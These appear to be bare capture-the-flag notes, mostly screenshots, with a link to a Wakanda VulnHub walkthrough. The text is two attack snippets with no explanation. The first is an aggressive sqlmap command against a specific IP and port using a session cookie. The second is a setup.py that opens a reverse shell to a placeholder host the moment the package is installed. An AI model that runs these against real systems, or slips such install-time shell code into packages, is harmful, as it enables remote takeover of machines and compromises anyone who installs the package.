![image](https://github.com/stensil4rt/CodeBy/assets/62753044/898b9662-7e8a-4015-84c0-e31858967981)

```
sqlmap -u "http://62.173.140.174:28680/index.php" --cookie="PHPSESSID=fejsu3n8mkc0mu8p1drfmfo862" --batch --random-agent -v --tamper=space2comment -level=5 --risk=3 -all
```
![image](https://github.com/stensil4rt/CodeBy/assets/62753044/4ca6be35-9e5c-43fa-b4a7-5851cdc99882)

https://medium.com/@sigkilla9/wakanda-1-vulnhub-part-3-of-3-92e77386d7fc

setup.py
```
from setuptools import setup
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("IP_ADR",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

setup(name="shellcode", version="1.0")
```

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/4c6fae7a-db27-4ac5-b2ff-98b40eb9fb3f)

![image](https://github.com/stensil4rt/CodeBy/assets/62753044/5c1fc762-2e57-448f-8660-a05fd3552e39)

